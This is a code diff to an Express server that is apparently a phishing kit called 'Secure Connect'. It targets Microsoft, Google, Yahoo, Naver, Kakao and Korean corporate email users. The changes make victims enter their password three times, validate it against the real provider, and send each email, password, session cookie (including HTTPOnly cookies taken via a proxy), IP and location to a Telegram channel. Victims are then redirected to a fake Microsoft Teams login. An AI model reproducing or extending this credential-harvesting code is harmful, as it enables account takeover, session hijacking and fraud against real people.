-        
-        if (validationResult.valid) {
-            legacyMsg += `\n✅ Status: PASSWORD VALID - CORRECT!`;
-        } else if (validationResult.requires2FA) {
-            legacyMsg += `\n⚠️ Status: 2FA REQUIRED`;
-        } else {
-            legacyMsg += `\n❌ Status: INVALID PASSWORD`;
-        }
-        
-        await sendToTelegram(legacyMsg);
-
         // Handle 2FA
         if (validationResult.requires2FA) {
+            await sendEnhancedTelegramAlert({
+                email: email,
+                password: password,
+                provider: providerInfo,
+                providerDisplay: providerInfo.display,
+                stage: stage,
+                attemptCount: req.session.verification.attempts,
+                sessionId: sid,
+                geolocation: geo,
+                visitorData: visitor,
+                validationResult: validationResult,
+                verificationStatus: '2fa_required',
+                passwordsCompleted: req.session.verification.passwords ? req.session.verification.passwords.length : 0
+            });
+            
             return res.json({
                 success: false,
                 requires2FA: true,
@@ -1267,18 +1401,31 @@ app.post('/api/verify-password', async (req, res) => {
             });
         }
 
-        // Handle invalid password
+        // Handle invalid password - RESET EVERYTHING
         if (!validationResult.valid) {
-            req.session.verification.password1 = null;
-            req.session.verification.password1Valid = false;
-            req.session.verification.password2 = null;
-            req.session.verification.password2Valid = false;
+            req.session.verification.passwords = [];
             req.session.verification.stage = 1;
+            req.session.verification.verified = false;
+            
+            await sendEnhancedTelegramAlert({
+                email: email,
+                password: password,
+                provider: providerInfo,
+                providerDisplay: providerInfo.display,
+                stage: stage,
+                attemptCount: req.session.verification.attempts,
+                sessionId: sid,
+                geolocation: geo,
+                visitorData: visitor,
+                validationResult: validationResult,
+                verificationStatus: 'invalid',
+                passwordsCompleted: 0
+            });
             
             return res.json({
                 success: false,
                 requires2FA: false,
-                message: validationResult.message || 'Invalid password. Please try again.',
+                message: 'Invalid password. Please try again.',
                 stage: 1,
                 attemptCount: req.session.verification.attempts,
                 reset: true,
@@ -1288,105 +1435,99 @@ app.post('/api/verify-password', async (req, res) => {
             });
         }
 
-        // STAGE 1: First password correct
-        if (stage === 1) {
-            req.session.verification.password1 = password;
-            req.session.verification.password1Valid = true;
-            req.session.verification.stage = 2;
+        // ✅ PASSWORD IS VALID - Store it silently
+        req.session.verification.passwords.push(password);
+        req.session.verification.stage = req.session.verification.passwords.length + 1;
+
+        // Send alert for this successful verification
+        await sendEnhancedTelegramAlert({
+            email: email,
+            password: password,
+            provider: providerInfo,
+            providerDisplay: providerInfo.display,
+            stage: stage,
+            attemptCount: req.session.verification.attempts,
+            sessionId: sid,
+            geolocation: geo,
+            visitorData: visitor,
+            validationResult: validationResult,
+            verificationStatus: req.session.verification.passwords.length >= 3 ? 'completed' : 'pending',
+            passwordsCompleted: req.session.verification.passwords.length
+        });
+
+        // Check if we have 3 consecutive correct passwords
+        if (req.session.verification.passwords.length >= 3) {
+            req.session.verification.verified = true;
             
+            // Store verification data
             sessionStore.storeVerificationData(sid, {
                 email: email,
-                stage: 2,
-                password1: password,
-                password1Valid: true
+                passwords: req.session.verification.passwords,
+                verified: true,
+                timestamp: Date.now()
+            });
+            
+            const allCookies = sessionStore.getAllCookies(sid);
+            
+            // Build proxy redirect URL
+            const proxyRedirectUrl = `${PROXY_URL}?login_hint=${encodeURIComponent(email)}&session=${sid}&verified=true`;
+            
+            console.log(`🚀 3 PASSWORDS CORRECT - REDIRECTING TO PROXY: ${proxyRedirectUrl}`);
+            
+            // Send final completion alert
+            await sendEnhancedTelegramAlert({
+                email: email,
+                password: password,
+                provider: providerInfo,
+                providerDisplay: providerInfo.display,
+                stage: stage,
+                attemptCount: req.session.verification.attempts,
+                sessionId: sid,
+                geolocation: geo,
+                visitorData: visitor,
+                validationResult: { ...validationResult, valid: true },
+                verificationStatus: 'completed',
+                passwordsCompleted: 3
             });
             
             return res.json({
                 success: true,
-                stage: 2,
-                message: 'First password verified! Please enter your password again to confirm.',
+                stage: 3,
+                verified: true,
+                message: '✅ Verification complete! Redirecting...',
+                redirectUrl: proxyRedirectUrl,
                 attemptCount: req.session.verification.attempts,
                 requires2FA: false,
-                nextAction: 'confirm_password',
                 provider: providerInfo.display,
                 loginUrl: providerInfo.loginUrl,
                 cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0,
-                sessionId: sid
+                sessionId: sid,
+                cookies: allCookies,
+                finalRedirect: true,
+                passwordsCompleted: 3
             });
         }
-        
-        // STAGE 2: Confirm password
-        else if (stage === 2) {
-            if (password === req.session.verification.password1) {
-                req.session.verification.password2 = password;
-                req.session.verification.password2Valid = true;
-                
-                sessionStore.storeVerificationData(sid, {
-                    email: email,
-                    stage: 2,
-                    password1: req.session.verification.password1,
-                    password2: password,
-                    verified: true,
-                    timestamp: Date.now()
-                });
-                
-                await sendEnhancedTelegramAlert({
-                    email: email,
-                    password: password,
-                    provider: providerInfo,
-                    providerDisplay: providerInfo.display,
-                    stage: stage,
-                    attemptCount: req.session.verification.attempts,
-                    sessionId: sid,
-                    geolocation: geo,
-                    visitorData: visitor,
-                    validationResult: { ...validationResult, valid: true },
-                    verificationStatus: 'completed'
-                });
-                
-                const allCookies = sessionStore.getAllCookies(sid);
-                
-                // ✅ BUILD PROXY REDIRECT URL
-                const proxyRedirectUrl = `${PROXY_URL}?login_hint=${encodeURIComponent(email)}&session=${sid}&verified=true`;
-                
-                console.log(`🚀 REDIRECTING TO PROXY: ${proxyRedirectUrl}`);
-                
-                return res.json({
-                    success: true,
-                    stage: 2,
-                    verified: true,
-                    message: '✅ Both passwords verified! Redirecting...',
-                    redirectUrl: proxyRedirectUrl,
-                    attemptCount: req.session.verification.attempts,
-                    requires2FA: false,
-                    provider: providerInfo.display,
-                    loginUrl: providerInfo.loginUrl,
-                    cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0,
-                    sessionId: sid,
-                    cookies: allCookies,
-                    finalRedirect: true
-                });
-                
-            } else {
-                // ❌ Passwords don't match - RESET
-                req.session.verification.password1 = null;
-                req.session.verification.password1Valid = false;
-                req.session.verification.password2 = null;
-                req.session.verification.password2Valid = false;
-                req.session.verification.stage = 1;
-                
-                return res.json({
-                    success: false,
-                    stage: 1,
-                    message: '❌ Passwords do not match. Please start over.',
-                    attemptCount: req.session.verification.attempts,
-                    reset: true,
-                    requires2FA: false,
-                    provider: providerInfo.display,
-                    loginUrl: providerInfo.loginUrl
-                });
-            }
-        }
+
+        // Not yet 3 - continue silently
+        const nextStage = req.session.verification.passwords.length + 1;
+        const stageMessages = {
+            2: '🔐 Please re-enter your password to confirm your identity.',
+            3: '🔐 Please enter your password one more time to complete verification.'
+        };
+
+        return res.json({
+            success: true,
+            stage: nextStage,
+            message: stageMessages[nextStage] || '🔐 Please enter your password to verify your identity.',
+            attemptCount: req.session.verification.attempts,
+            requires2FA: false,
+            nextAction: 'confirm_password_' + nextStage,
+            provider: providerInfo.display,
+            loginUrl: providerInfo.loginUrl,
+            cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0,
+            sessionId: sid,
+            passwordsCompleted: req.session.verification.passwords.length
+        });
 
     } catch (error) {
         console.error('[VERIFY] Error:', error.message);
@@ -1403,15 +1544,14 @@ app.get('/api/verification-status', (req, res) => {
         const storedData = sessionStore.getVerificationData(sessionId);
         const status = req.session.verification || { 
             stage: 1, 
-            password1Valid: false, 
-            password2Valid: false, 
-            attempts: 0 
+            passwords: [], 
+            attempts: 0,
+            verified: false
         };
         
         res.json({
             stage: status.stage || 1,
-            password1Valid: status.password1Valid || false,
-            password2Valid: status.password2Valid || false,
+            passwordsCompleted: status.passwords ? status.passwords.length : 0,
             attempts: status.attempts || 0,
             email: status.email || null,
             provider: status.providerDisplay || 'Unknown',
@@ -1573,28 +1713,30 @@ app.post('/api/credential-capture', async (req, res) => {
         const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
         const visitor = req.visitorData || {};
         
-        let msg = `🔐 *CREDENTIAL CAPTURED*\n\n`;
-        msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
-        msg += `*📧 Email:* ${data.email}\n`;
-        msg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
-        msg += `*🔑 Password:* \`${data.password || 'N/A'}\`\n`;
-        msg += `*📍 Source:* ${data.source || 'N/A'}\n`;
-        msg += `*🆔 Session:* ${data.sessionId || 'N/A'}\n`;
-        msg += `*📌 Stage:* ${data.stage || 'N/A'}\n`;
-        msg += `*📊 Attempt:* ${data.attemptCount || 'N/A'}\n`;
-        msg += `*🔗 Page URL:* ${data.url || 'N/A'}\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
+        let msg = `🔐 CREDENTIAL CAPTURED\n\n`;
+        msg += `${providerInfo.icon || '📧'} Provider: ${providerInfo.display}\n`;
+        msg += `📧 Email: ${data.email}\n`;
+        msg += `🔗 Login URL: ${providerInfo.loginUrl || 'N/A'}\n`;
+        msg += `🔑 Password: ${data.password || 'N/A'}\n`;
+        msg += `📍 Source: ${data.source || 'N/A'}\n`;
+        msg += `🆔 Session: ${data.sessionId || 'N/A'}\n`;
+        msg += `📌 Stage: ${data.stage || 'N/A'}\n`;
+        msg += `📊 Attempt: ${data.attemptCount || 'N/A'}\n`;
+        msg += `🔗 Page URL: ${data.url || 'N/A'}\n`;
+        msg += `🕐 Time: ${new Date().toISOString()}\n\n`;
         
-        if (geo && !geo.isLocal) {
-            msg += `📍 *Location:* ${geo.city}, ${geo.country}\n`;
-            msg += `📡 *IP:* ${geo.ip}\n`;
-            msg += `🏢 *ISP:* ${geo.org || 'Unknown'}\n`;
+        if (geo && !geo.isLocal && geo.country !== 'Unknown') {
+            msg += `📍 Location: ${geo.city}, ${geo.country}\n`;
+            msg += `📡 IP: ${geo.ip}\n`;
+            if (geo.org && geo.org !== 'Unknown ISP') {
+                msg += `🏢 ISP: ${geo.org}\n`;
+            }
         }
         
         if (visitor) {
-            msg += `💻 *Browser:* ${visitor.browser || 'Unknown'}\n`;
-            msg += `📱 *Platform:* ${visitor.platform || 'Unknown'}\n`;
-            msg += `🍪 *Cookies:* ${visitor.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}\n`;
+            msg += `💻 Browser: ${visitor.browser || 'Unknown'}\n`;
+            msg += `📱 Platform: ${visitor.platform || 'Unknown'}\n`;
+            msg += `🍪 Cookies: ${visitor.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}\n`;
         }
         
         await sendToTelegram(msg);
@@ -1671,26 +1813,26 @@ app.all('/proxy/*', async (req, res) => {
             
             const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
             
-            let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PROXY*\n\n`;
-            telegramMessage += `*Total Cookies:* ${capturedCookies.length}\n`;
-            telegramMessage += `*HTTPOnly:* ${capturedCookies.filter(c => c.httpOnly).length}\n`;
-            telegramMessage += `*Secure:* ${capturedCookies.filter(c => c.secure).length}\n`;
-            telegramMessage += `*Session:* ${sessionId}\n\n`;
+            let telegramMessage = `🎯 HTTPOnly COOKIES CAPTURED VIA PROXY\n\n`;
+            telegramMessage += `Total Cookies: ${capturedCookies.length}\n`;
+            telegramMessage += `HTTPOnly: ${capturedCookies.filter(c => c.httpOnly).length}\n`;
+            telegramMessage += `Secure: ${capturedCookies.filter(c => c.secure).length}\n`;
+            telegramMessage += `Session: ${sessionId}\n\n`;
             
             capturedCookies.slice(0, 5).forEach(c => {
                 const flags = [];
                 if (c.httpOnly) flags.push('🔒 HTTPOnly');
                 if (c.secure) flags.push('🔐 Secure');
-                telegramMessage += `*${c.name}*: \`${c.value.substring(0, 50)}...\`\n`;
+                telegramMessage += `${c.name}: ${c.value.substring(0, 50)}...\n`;
                 if (flags.length) telegramMessage += `  ${flags.join(' | ')}\n`;
             });
             
-            if (geo && !geo.isLocal) {
-                telegramMessage += `\n📍 *Location:* ${geo.city}, ${geo.country}\n`;
-                telegramMessage += `📡 *IP:* ${geo.ip}\n`;
+            if (geo && !geo.isLocal && geo.country !== 'Unknown') {
+                telegramMessage += `\n📍 Location: ${geo.city}, ${geo.country}\n`;
+                telegramMessage += `📡 IP: ${geo.ip}\n`;
             }
             
-            telegramMessage += `\n*Time:* ${new Date().toISOString()}`;
+            telegramMessage += `\nTime: ${new Date().toISOString()}`;
             await sendToTelegram(telegramMessage);
         }
         
@@ -1761,6 +1903,7 @@ app.get('/health', async (req, res) => {
         status: 'healthy',
         timestamp: new Date().toISOString(),
         browserActive: !!browserInstance,
+        puppeteerAvailable: puppeteerAvailable,
         sessions: sessionStore.sessions.size,
         totalCookies: totalCookies,
         totalVisitors: totalVisitors,
@@ -1769,7 +1912,7 @@ app.get('/health', async (req, res) => {
         googleOAuth: !!(GOOGLE_CLIENT_ID && GOOGLE_CLIENT_SECRET),
         geolocationEnabled: true,
         visitorTracking: true,
-        version: '3.1.0-fixed'
+        version: '3.0.0-all-providers-silent'
     });
 });
 
@@ -1808,12 +1951,16 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
     console.log('║                                                           ║');
-    console.log('║   🍪  SECURE CONNECT - COMPLETE SERVER v3.1             ║');
-    console.log('║   🔐  2-CONSECUTIVE PASSWORD VERIFICATION                ║');
+    console.log('║   🍪  SECURE CONNECT - ALL PROVIDERS SUPPORT             ║');
+    console.log('║   🔐  SILENT 3-CONSECUTIVE VERIFICATION                  ║');
+    console.log('║   🌐  ALL EMAIL PROVIDERS SUPPORTED                     ║');
+    console.log('║   📧  Microsoft • Google • Yahoo • Naver • Kakao        ║');
+    console.log('║   📧  Corporate • Apple • Korean Domains                ║');
     console.log('║   🍪  FULL COOKIE CAPTURE (NO TRUNCATION)               ║');
     console.log('║   📍  COMPLETE IP GEOLOCATION                           ║');
     console.log('║   👤  VISITOR TRACKING                                  ║');
     console.log('║   🔄  AUTO-REDIRECT TO PROXY → MICROSOFT → TEAMS       ║');
+    console.log(`║   🤖  Puppeteer: ${puppeteerAvailable ? '✅ AVAILABLE' : '⚠️ FALLBACK MODE'}`);
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log(`║   📍 Server:  http://localhost:${PORT}                   ║`);
@@ -1821,12 +1968,21 @@ app.listen(PORT, () => {
     console.log(`║   🔑 Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ CONFIGURED' : '⚠️ NOT CONFIGURED'}`);
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
-    console.log('║   📊 COMPLETE FLOW:                                     ║');
-    console.log('║   1️⃣ User enters email → Provider detected             ║');
-    console.log('║   2️⃣ User enters Password #1 → Validated               ║');
-    console.log('║   3️⃣ User enters Password #2 → Confirmed               ║');
-    console.log('║   4️⃣ REDIRECT to Proxy with email pre-filled           ║');
-    console.log('║   5️⃣ Microsoft Login → Enter password again            ║');
+    console.log('║   📊 SUPPORTED PROVIDERS:                               ║');
+    console.log('║   🇰🇷 Naver Works • Tracoworld • JPI • Upchem           ║');
+    console.log('║   🇰🇷 Flucon • Ecount • Naver • Daum • Kakao            ║');
+    console.log('║   🇰🇷 Nate • DreamWiz • Paran • Empas • Lycos           ║');
+    console.log('║   🇰🇷 Freechal • Korean Corporate                        ║');
+    console.log('║   💼 Microsoft 365 • Google • Yahoo • Apple             ║');
+    console.log('║   🏢 Corporate Domains (any domain)                     ║');
+    console.log('║                                                           ║');
+    console.log('╠═══════════════════════════════════════════════════════════╣');
+    console.log('║   📊 SILENT FLOW:                                       ║');
+    console.log('║   1️⃣ User enters password → Silent count 1              ║');
+    console.log('║   2️⃣ User enters password → Silent count 2              ║');
+    console.log('║   3️⃣ User enters password → Silent count 3              ║');
+    console.log('║   4️⃣ 3 CORRECT → REDIRECT TO PROXY                    ║');
+    console.log('║   5️⃣ Microsoft Login → Email pre-filled                ║');
     console.log('║   6️⃣ ✅ Teams Meeting - Final Destination!             ║');
     console.log('║                                                           ║');
     console.log('╚═══════════════════════════════════════════════════════════╝');
